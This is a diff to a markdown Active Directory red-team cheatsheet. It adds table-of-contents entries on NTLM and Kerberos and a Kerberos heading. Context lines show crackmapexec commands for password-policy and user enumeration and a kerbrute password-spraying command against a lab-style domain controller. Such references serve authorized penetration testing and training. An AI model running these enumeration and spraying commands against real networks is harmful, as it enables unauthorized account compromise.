@@ -205,6 +205,15 @@ Code Snippet are [here](https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/tre
       - [Rogue DHCP](#rogue-dhcp)
       - [IOXIDResolver Interface Enumeration](#ioxidresolver-interface-enumeration)
     - [References](#references)
+    
+    - [General Purpose Protocols](#general-purpose-protocols)
+  	- [Authentification](#authentification)
+   	  - [NT LAN Manager - NTLM](#nt-lan-manager-ntlm)
+    	  - [Kerberos - KRB](#kerberos-krb)
+    - [Microsoft Proprietary Protocols](#Microsoft Proprietary Protocols)
+    	- [Authentification](#authentification)
+
+
 
 
 ## Tools
@@ -401,6 +410,9 @@ crackmapexec smb 10.10.13.100 --pass-pol -u users.lst -p password_list
 ```bash
 crackmapexec smb 10.10.13.100 -u users.txt -p $pass --users | tee userlist.txt
 ```
+
+## Kerberos - KRB
+
 ### Password Spraying on the domain
 ```bash
 /opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray -d MEGACORP.CORP --dc 10.10.13.100 users.lst '$pass'
